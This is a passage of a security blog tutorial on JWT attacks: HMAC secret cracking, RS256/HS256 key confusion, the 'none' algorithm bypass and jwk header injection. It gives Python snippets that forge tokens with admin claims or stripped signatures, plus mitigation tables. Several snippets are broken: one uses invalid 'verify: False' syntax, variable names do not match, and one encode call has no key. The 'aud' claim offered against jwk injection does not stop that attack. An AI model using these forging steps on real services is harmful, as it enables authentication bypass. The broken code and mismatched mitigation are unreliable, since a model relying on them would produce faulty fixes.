+<p><strong>JWT &rsquo;none&rsquo; algorithm confusion</strong></p>
+</li>
+<li>
+<p><strong>The RS/HS256 public key mismatch vulnerability</strong></p>
+</li>
+<li>
+<p><strong>Null signature vulnerability</strong></p>
+</li>
+<li>
+<p>jwk - Do Not Trust received claims:</p>
+<ul>
+<li><strong>jwk injection vulnerability</strong></li>
+<li>jwk SSRF attacks</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>I won&rsquo;t go deep into cryptography, which is its own can of worms.</p>
+<ul>
+<li>JWE - Weak symmetric keys
+<ul>
+<li>HMAC - offline brute-force</li>
+<li>RSA - (don&rsquo;t or prefer hybrid + AES)</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="-cve-2016-10555---the-rshs256-public-key-mismatch-vulnerability-">
+  [ CVE-2016-10555 - The RS/HS256 public key mismatch vulnerability ]
+  <a href="#-cve-2016-10555---the-rshs256-public-key-mismatch-vulnerability-" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<hr>
+<p>To understand how this vulnerability work you need to know how symmetrical and asymmetrical encryption  work. If you know already, go ahead and just skip this part.</p>
+<hr>
+<table>
+<thead>
+<tr>
+<th>Symmetrical encryption</th>
+</tr>
+</thead>
+</table>
+<p>The algorithm <code>&quot;HS256&quot;</code>  stands for keyed-<strong>H</strong>ash <strong>M</strong>essage <strong>A</strong>uthentication <strong>C</strong>ode (<code>HMAC</code>) using <strong>S</strong>ecure <strong>H</strong>ash <strong>A</strong>lgorithm (<code>SHA256</code> - 256 bits aka 32 bytes aka 64 hex chars).</p>
+<p>HMAC signed keys (algs <code>HS256/HS384/HS512</code>) use symmetric encryption, meaning the <code>key that signs</code> the token is also <code>used to verify it</code>.</p>
+<p>Often these are set to simple passphrases/passwords.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>HMAC_key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;fluffy_the_cat&#39;</span>
+</span></span></code></pre></div><h4 id="example">
+  Example
+  <a href="#example" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> jwt  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create a valid JWT  </span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> { <span style="color:#e6db74">&#34;flag&#34;</span>:<span style="color:#e6db74">&#34;ladybug&#34;</span>, <span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;inthemug&#34;</span>, <span style="color:#e6db74">&#34;admin&#34;</span>: <span style="color:#66d9ef">True</span>}  
+</span></span><span style="display:flex;"><span>token <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>encode(payload, <span style="color:#e6db74">&#39;secret_key&#39;</span>, algorithm<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;HS256&#39;</span>)  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(token) 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#&#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmbGFnIjoibGFkeWJ1ZyIsImlhdCI6OTAwMDAwMDAsIm5hbWUiOiJpbnRoZW11ZyIsImFkbWluIjp0cnVlfQ.oA0NXipJEgr2vSsytsOXrUXDj8EHwWrHvaIduLCYns0&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(jwt<span style="color:#f92672">.</span>decode(token, <span style="color:#e6db74">&#39;secret_key&#39;</span>, algorithms<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;HS256&#39;</span>))
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#{&#39;flag&#39;: &#39;ladybug&#39;, &#39;name&#39;: &#39;inthemug&#39;, &#39;admin&#39;: True}</span>
+</span></span></code></pre></div><h4 id="attack">
+  Attack
+  <a href="#attack" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<p>If an attacker can crack/brute-force the HMAC secret ( and he can do it easily offline, with enough computational power ) then he would be able to generate a valid signature for any arbitrary token, compromising the entire mechanism allowing to forge anything you like in the token .</p>
+<p>to name a few:</p>
+<ul>
+<li><a href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a></li>
+<li><a href="https://github.com/openwall/john">https://github.com/openwall/john</a></li>
+<li>
+<ul>
+<li><a href="https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py">https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py</a> (converts the token to john the ripper format</li>
+</ul>
+</li>
+<li><a href="https://github.com/AresS31/jwtcat">https://github.com/AresS31/jwtcat</a>   <code>python</code></li>
+<li><a href="https://github.com/lmammino/jwt-cracker">https://github.com/lmammino/jwt-cracker</a>  <code>node.js</code></li>
+<li><a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a>  <code>c</code></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Mitigation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Skip HMAC signing and go for asymmetric crypto. It&rsquo;s a lot stronger.</td>
+</tr>
+<tr>
+<td>If you can&rsquo;t skip then make sure you use long, random key stings and do not forget to rotate them often.</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<table>
+<thead>
+<tr>
+<th>Asymmetrical keys</th>
+</tr>
+</thead>
+</table>
+<p>RSA is one of the most widely used cryptosystems today. It was developed in 1977 by Ron Rivest,
+Adi Shamir and Leonard Adleman, whose initials were used to name the algorithm.</p>
+<blockquote>
+<p>private key  -  used for <code>signing</code> ( encryption )</p>
+<p>public key  - used for <code>verifing</code> ( decryption )</p>
+</blockquote>
+<p>Asymmetric keys should provides better security but still it have some weakness if you are not careful with configurations as well as storage and transmission of your keys. Any tampering with the public key could have security implications.</p>
+<h4 id="example-1">
+  Example
+  <a href="#example-1" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<p>To sign with RSA keys you first need to create them. You have two options:</p>
+<table>
+<thead>
+<tr>
+<th>[1] ssh-keygen</th>
+</tr>
+</thead>
+</table>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># help</span>
+</span></span><span style="display:flex;"><span>ssh-keygen --help
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># [ -t type] [ -N new-passphrase ] [-f output keyfile]</span>
+</span></span><span style="display:flex;"><span>ssh-keygen -t rsa -N <span style="color:#e6db74">&#39;&#39;</span> -f key 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># - e [-f input_keyfile] [-m key_format]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># serialization to PEM format</span>
+</span></span><span style="display:flex;"><span>ssh-keygen -f key.pub -m PEM -e &gt; key.pem
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># create pub/private keys</span>
+</span></span><span style="display:flex;"><span>/current_working_dir/
+</span></span><span style="display:flex;"><span>key
+</span></span><span style="display:flex;"><span>key.pub
+</span></span><span style="display:flex;"><span>key.pem
+</span></span></code></pre></div><table>
+<thead>
+<tr>
+<th>[2] cryptography libraries</th>
+</tr>
+</thead>
+</table>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> jwt  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> cryptography.hazmat.primitives <span style="color:#f92672">import</span> serialization  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> {  
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;sub&#34;</span>: <span style="color:#e6db74">&#34;123&#34;</span>,  
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;Ladyinthemug&#34;</span>,  
+</span></span><span style="display:flex;"><span>}  
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># read and load the key  </span>
+</span></span><span style="display:flex;"><span>private_key <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;key&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span>read()  
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># serialize it</span>
+</span></span><span style="display:flex;"><span>private_key <span style="color:#f92672">=</span> serialization<span style="color:#f92672">.</span>load_ssh_private_key(private_key<span style="color:#f92672">.</span>encode(), password<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>)  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>public_key <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;key.pub&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>public_key <span style="color:#f92672">=</span> serialization<span style="color:#f92672">.</span>load_ssh_public_key(public_key<span style="color:#f92672">.</span>encode())  
+</span></span></code></pre></div><p>more advanced - do that only if you know what you are doing</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> jwt  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> cryptography.hazmat.primitives.asymmetric <span style="color:#f92672">import</span> rsa  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Generate an RSA public key (you can use an existing key)  </span>
+</span></span><span style="display:flex;"><span>private_key <span style="color:#f92672">=</span> rsa<span style="color:#f92672">.</span>generate_private_key(  
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># use small fixed value, choosing non-standart large values may case security risk</span>
+</span></span><span style="display:flex;"><span>    public_exponent<span style="color:#f92672">=</span><span style="color:#ae81ff">65537</span>,  
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># key size (or modulus) in bits, the larger it is the higher security,</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># but slower and need more computational power for gen, enc or decryption.</span>
+</span></span><span style="display:flex;"><span>    key_size<span style="color:#f92672">=</span><span style="color:#ae81ff">2048</span>  
+</span></span><span style="display:flex;"><span>                   
+</span></span><span style="display:flex;"><span>)  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>public_key <span style="color:#f92672">=</span> private_key<span style="color:#f92672">.</span>public_key()  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># serialization of private/public keys to PEM format</span>
+</span></span><span style="display:flex;"><span>private_pem <span style="color:#f92672">=</span> private_key<span style="color:#f92672">.</span>private_bytes(  
+</span></span><span style="display:flex;"><span>    encoding<span style="color:#f92672">=</span>serialization<span style="color:#f92672">.</span>Encoding<span style="color:#f92672">.</span>PEM,  
+</span></span><span style="display:flex;"><span>    format<span style="color:#f92672">=</span>serialization<span style="color:#f92672">.</span>PrivateFormat<span style="color:#f92672">.</span>PKCS8,  
+</span></span><span style="display:flex;"><span>    encryption_algorithm<span style="color:#f92672">=</span>serialization<span style="color:#f92672">.</span>NoEncryption()  
+</span></span><span style="display:flex;"><span>)  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>public_pem <span style="color:#f92672">=</span> public_key<span style="color:#f92672">.</span>public_bytes(  
+</span></span><span style="display:flex;"><span>    encoding<span style="color:#f92672">=</span>serialization<span style="color:#f92672">.</span>Encoding<span style="color:#f92672">.</span>PEM,  
+</span></span><span style="display:flex;"><span>    format<span style="color:#f92672">=</span>serialization<span style="color:#f92672">.</span>PublicFormat<span style="color:#f92672">.</span>SubjectPublicKeyInfo  
+</span></span><span style="display:flex;"><span>)
+</span></span></code></pre></div><table>
+<thead>
+<tr>
+<th>[3] encoding/decoding</th>
+</tr>
+</thead>
+</table>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># create token</span>
+</span></span><span style="display:flex;"><span>token <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>encode(payload<span style="color:#f92672">=</span>payload, key<span style="color:#f92672">=</span>private_key, algorithm<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;RS256&#39;</span>)  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(token)  
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJuYW1lIjoiTGFkeWludGhlbXVnIn0.JxvICbCwpo6F4Q5haz668JzoCn6A900dkHD_fA5IT6R026DTwnlyR3LxZiMQfwWmWP6excgS92Re8LHn62XObDD9F2hd3y0tS5iEUu0AoiW21TCH2VhOAn4ZseScIuPy5CWsVhj9RGm4vj3QJadvcj6XjFgHq_wIcRIe_FbT28ad-kYQMEwKlAq0VFWoimCB0H1dGZ4pmB8x5XN3g4t8IkUij0-wPDvqwDvndbB3n2FTTKpZGkzR5D24PLor9VjD8cQmHwbO6eTETkPLzniId2JccKl3XhOWnLAGCuXGvqkleoD9GTc068xSy7bln-JyfvnzsdbrkGU-M_1ZexmPKT_vP5avwGvEvP38rYo5gW3NumMvWhm3clA9rAm2Ld9s_80uIAI4Te0AR3TzC-stl28nRqdN3umTgW1mAcuO2sNhFy-M7TZH6U-u0Dp8YljNIU6sCKtx8VL0VkbT3Cn2rm08KqxCw3Nn1t3j6-EZBKPHRBRTWp43wRQSK9hRE_Bh</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># decode</span>
+</span></span><span style="display:flex;"><span>print(jwt<span style="color:#f92672">.</span>decode(jwt<span style="color:#f92672">=</span>token, key<span style="color:#f92672">=</span>public_key, algorithms<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;RS256&#39;</span>, ]))
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># {&#39;sub&#39;: &#39;123&#39;, &#39;name&#39;: &#39;Ladyinthemug&#39;}</span>
+</span></span></code></pre></div><hr>
+<h4 id="attack-1">
+  Attack
+  <a href="#attack-1" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<p>If the server is expecting RSA : private key signs - public key verifies, but is sent HMAC-SHA with RSA’s public key, the server will think the <code>public key</code>is actually an <code>HMAC secret key</code>!</p>
+<h4 id="the-scenario-of-such-attack-could-go-like-that-">
+  the scenario of such attack could go like that :
+  <a href="#the-scenario-of-such-attack-could-go-like-that-" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<ul>
+<li>
+<p>[1] your RSA public key of the token is been obtained/exposed some how( sometimes it&rsquo;s transmitted with <code>JWT</code> itself , or check out more ways to <a href="https://github.com/ticarpi/jwt_tool/wiki/Finding-Public-Keys">find_public-keys</a>)</p>
+</li>
+<li>
+<p>[2] confirmed that format of the public key is right ( you can expect it to be in <a href="https://en.wikipedia.org/wiki/Privacy-Enhanced_Mail">PEM format</a>)</p>
+</li>
+</ul>
+<p><strong><code>PEM</code> format</strong> is a way of encoding binary/DER data in a way that is more convenient. It derives from a 1990s attempt at secure email named <code>Privacy-Enhanced Mail</code> hence the name.</p>
+<p>The data content is <code>base64-encoded</code>, and the encoded data is typically broken into lines of 64 characters (or 76 characters in MIME format), except for the last line, which may be shorter.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">-----</span>BEGIN TYPE OF DATA<span style="color:#f92672">-----</span>
+</span></span><span style="display:flex;"><span>Base64<span style="color:#f92672">-</span>encodedDataLine1
+</span></span><span style="display:flex;"><span>Base64<span style="color:#f92672">-</span>encodedDataLine2 <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Base64<span style="color:#f92672">-</span>encodedLastline 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-----</span>END TYPE OF DATA<span style="color:#f92672">-----</span>
+</span></span></code></pre></div><ul>
+<li>[3] header tampered by switching RSA -&gt; HS256</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>header
+</span></span><span style="display:flex;"><span>	alg: <span style="color:#e6db74">&#34;RS256&#34;</span> -&gt; <span style="color:#e6db74">&#34;HS256&#34;</span>
+</span></span><span style="display:flex;"><span>	typ: <span style="color:#e6db74">&#34;JWT&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2<span style="color:#f92672">]</span> tampered payload
+</span></span><span style="display:flex;"><span>	sub: <span style="color:#e6db74">&#39;ladybug&#39;</span>
+</span></span><span style="display:flex;"><span>	role: <span style="color:#e6db74">&#39;user&#39;</span>  -&gt; <span style="color:#e6db74">&#34;admin&#34;</span>
+</span></span></code></pre></div><ul>
+<li>
+<p>[4] obtained public RSA key used as symmetric key for HMAC.</p>
+</li>
+<li>
+<p>[5] tampered token send to the server .</p>
+</li>
+</ul>
+<hr>
+<table>
+<thead>
+<tr>
+<th>Mitigation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>The JWT configuration should only allow  either the HMAC algorithms <em><strong>OR</strong></em> the Public Key algorithms, never both.</td>
+</tr>
+</tbody>
+</table>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Determine the type of token you want to generate (HMAC or RSA)</span>
+</span></span><span style="display:flex;"><span>generate_hmac_token <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>  <span style="color:#75715e"># change to False for RSA token for example </span>
+</span></span></code></pre></div><hr>
+<h3 id="-cve-2015-2951---none-algorithm-confusion">
+  [ CVE-2015-2951 - &rsquo;none&rsquo; algorithm confusion]
+  <a href="#-cve-2015-2951---none-algorithm-confusion" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<hr>
+<p>JWTs can be signed using a range of different algorithms, but can also be left unsecured. In this case, the JWT <code>alg</code> parameter is set to <code>none</code>, meaning the backend will not perform signature verification.</p>
+<p>Due to the obvious dangers of this, secure servers usually reject tokens with no signature.
+But attacker might still has a chance to bypass weak filters ( string parsing ) , using classic obfuscation techniques, such as mixed capitalization or unexpected encoding. (<code>NonE</code>, <code>nONE</code>&hellip; )</p>
+<h4 id="example-2">
+  Example
+  <a href="#example-2" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> Token header values:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>	 <span style="color:#e6db74">&#34;typ&#34;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;JWT&#34;</span>
+</span></span><span style="display:flex;"><span>	 <span style="color:#e6db74">&#34;alg&#34;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;HS256&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2<span style="color:#f92672">]</span> We temper it with none:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>	 <span style="color:#e6db74">&#34;typ&#34;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;JWT&#34;</span>
+</span></span><span style="display:flex;"><span>	 <span style="color:#e6db74">&#34;alg&#34;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;none&#34;</span> <span style="color:#75715e"># &#39;NoNe&#39;, &#39;nONE&#39; etc</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">[</span>3<span style="color:#f92672">]</span> Token payload values stay the same:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>	 <span style="color:#e6db74">&#34;flag&#34;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ladybug&#34;</span>
+</span></span><span style="display:flex;"><span>	 <span style="color:#e6db74">&#34;name&#34;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;inthemug&#34;</span>
+</span></span><span style="display:flex;"><span>	 <span style="color:#e6db74">&#34;admin&#34;</span> <span style="color:#f92672">=</span> True
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>4<span style="color:#f92672">]</span> By switch the algorithm to <span style="color:#e6db74">&#39;none&#39;</span> you ditch the signature and can gain the bypasss.
+</span></span></code></pre></div><hr>
+<ul>
+<li>However, this won&rsquo;t work unless you <strong>remove</strong> the signature</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#e6db74">&#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmbGFnIjoibGFkeWJ1ZyIsIm5hbWUiOiJpbnRoZW11ZyIsImFkbWluIjp0cnVlfQ.[&#39;</span>deleted signature<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">]</span> 
+</span></span></code></pre></div><ul>
+<li>Alternatively</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>decoded<span style="color:#f92672">=</span>jwt<span style="color:#f92672">.</span>decode(jwtToken, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)  <span style="color:#75715e"># need to decode the token before encoding with type &#39;None&#39;</span>
+</span></span><span style="display:flex;"><span>newtoken<span style="color:#f92672">=</span>jwt<span style="color:#f92672">.</span>encode(decodedToken, key<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>, algorithm<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(newtoken<span style="color:#f92672">.</span>decode())
+</span></span></code></pre></div><table>
+<thead>
+<tr>
+<th>Mitigation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://security.snyk.io/vuln/SNYK-PYTHON-PYJWT-40733"> Use up to date libraries :)</a></td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h3 id="-cve-2018-0114---jwt-header-parameter-injections">
+  [ CVE-2018-0114 - JWT header parameter injections]
+  <a href="#-cve-2018-0114---jwt-header-parameter-injections" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<hr>
+<p>Among other things, the JWS headers often contain several other parameters.</p>
+<h5 id="the-following-ones-are-of-particular-interest-to-attackers-">
+  The following ones are of particular interest to attackers :
+  <a href="#the-following-ones-are-of-particular-interest-to-attackers-" class="h-anchor" aria-hidden="true">#</a>
+</h5>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>jwk</td>
+<td>creates an embedded JSON object representing the key</td>
+</tr>
+<tr>
+<td>jku</td>
+<td>set URL from which servers can fetch a set of keys containing the correct key</td>
+</tr>
+<tr>
+<td>kid</td>
+<td>provide an ID that servers can use to identify the correct key in cases where there are multiple keys to choose from</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<table>
+<thead>
+<tr>
+<th><code>jwk</code> JSON Web Key</th>
+</tr>
+</thead>
+</table>
+<p>You can exploit it by signing a modified JWS using your own <strong>RSA private key,</strong> then <strong>embedding the matching public key</strong> in the <code>jwk</code> header.</p>
+<h4 id="example-3">
+  Example
+  <a href="#example-3" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Define your payload</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;sub&#34;</span>: <span style="color:#e6db74">&#34;1234&#34;</span>, <span style="color:#e6db74">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;ladybuginthemug&#34;</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Load your private key</span>
+</span></span><span style="display:flex;"><span>private_key <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;private_key.pem&#34;</span>)<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create a JWT token with a modified header and payload</span>
+</span></span><span style="display:flex;"><span>token <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>encode(payload, private_key, algorithm<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;RS256&#39;</span>, headers<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;jwk&#34;</span>: {<span style="color:#e6db74">&#34;kty&#34;</span>: <span style="color:#e6db74">&#34;RSA&#34;</span>, <span style="color:#e6db74">&#34;n&#34;</span>: <span style="color:#e6db74">&#34;your_public_key_n&#34;</span>, <span style="color:#e6db74">&#34;e&#34;</span>: <span style="color:#e6db74">&#34;your_public_key_e&#34;</span>}})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(token)
+</span></span></code></pre></div><p>You can also perform this attack manually by adding the <code>jwk</code> header yourself. However, you may also need to update the JWS&rsquo;s <code>kid</code> header parameter to match the <code>kid</code> of the embedded key.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Modify the header to include the &#39;jwk&#39; parameter</span>
+</span></span><span style="display:flex;"><span>modified_header <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;alg&#34;</span>: <span style="color:#e6db74">&#34;RS256&#34;</span>, <span style="color:#e6db74">&#34;jwk&#34;</span>: {<span style="color:#e6db74">&#34;kty&#34;</span>: <span style="color:#e6db74">&#34;RSA&#34;</span>, <span style="color:#e6db74">&#34;n&#34;</span>: <span style="color:#e6db74">&#34;your_public_key_n&#34;</span>, <span style="color:#e6db74">&#34;e&#34;</span>: <span style="color:#e6db74">&#34;your_public_key_e&#34;</span>},<span style="color:#e6db74">&#34;kid&#34;</span>: <span style="color:#e6db74">&#34;your/kid/somewhere&#34;</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Decode the existing token</span>
+</span></span><span style="display:flex;"><span>decoded_payload <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>decode(existing_token, verify: <span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>deecoded_payload <span style="color:#f92672">=</span> decoded_payload[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create a new token with the modified header and the same payload</span>
+</span></span><span style="display:flex;"><span>new_token <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>encode(decoded_payload, headers<span style="color:#f92672">=</span>modified_header, algorithm<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;RS256&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(new_token)
+</span></span></code></pre></div><p>Example of mitigation</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Add audience (aud) claim to prevent usage on different websites</span>
+</span></span><span style="display:flex;"><span>payload[<span style="color:#e6db74">&#34;aud&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;example.com&#34;</span>
+</span></span><span style="display:flex;"><span>
